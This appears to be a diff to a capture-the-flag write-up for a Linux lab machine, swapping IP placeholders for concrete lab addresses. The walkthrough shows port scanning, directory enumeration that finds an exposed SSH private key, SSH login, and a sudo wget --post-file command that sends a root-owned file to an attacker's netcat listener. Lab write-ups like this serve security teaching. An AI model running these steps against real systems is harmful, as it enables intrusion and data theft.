@@ -9,7 +9,7 @@ Linux machine with Apache on port 80 and SSH on port 22. The username leaks from
 ### Network Scanning
 
 ```bash
-sudo nmap -sV -A <target_ip>
+sudo nmap -sV -A 10.66.171.54
 ```
 
 Open ports:
@@ -28,8 +28,8 @@ jessie
 Directory enumeration on the root, then recursively on the discovered path:
 
 ```bash
-gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
-gobuster dir -u http://<target_ip>/sitemap -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -t 20
+gobuster dir -u http://10.66.171.54 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.66.171.54/sitemap -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -t 20
 ```
 
 A path within `/sitemap` exposed a file named `id_rsa` - an SSH private key accessible without authentication.
@@ -40,7 +40,7 @@ A path within `/sitemap` exposed a file named `id_rsa` - an SSH private key acce
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa jessie@<target_ip>
+ssh -i id_rsa jessie@10.66.171.54
 ```
 
 ---
@@ -72,7 +72,7 @@ nc -lvp 3344
 On the target:
 
 ```bash
-sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<attacker_ip>:3344/
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.66.97.183:3344/
 ```
 
 The file content arrives in the netcat output.
